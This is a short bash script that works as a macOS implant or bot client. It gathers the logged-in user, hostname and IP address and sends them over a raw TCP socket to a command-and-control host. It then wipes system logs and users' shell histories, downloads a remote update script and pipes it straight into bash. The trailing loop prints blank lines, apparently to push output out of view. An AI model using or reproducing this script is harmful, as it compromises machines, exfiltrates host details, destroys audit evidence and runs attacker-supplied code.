#!/bin/bash
host=boesen.science
down_port=2042
up_port=2043

user=$(stat -f "%Su" /dev/console) # Get user currently logged in (in GUI).
hostname=$(hostname)
ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')

# Send data to C&C
exec 3<>/dev/tcp/$host/$up_port
printf "JOIN: $user $hostname $ip" >&3

function timeout() { perl -e 'alarm shift; exec @ARGV' "$@"; }
# Print response, time out if none
timeout 1 cat <&3 && echo

printf "$user $hostname" > /etc/info
echo "$ip" >> /etc/ips

rm -rf /var/log/*
rm -f /var/root/.*history /Users/*/.*history

curl -L $host:$down_port/mac/update.sh |bash

for _ in {1..50}; do
    printf "\\n\\n\\n\\n\\n\\n"
done
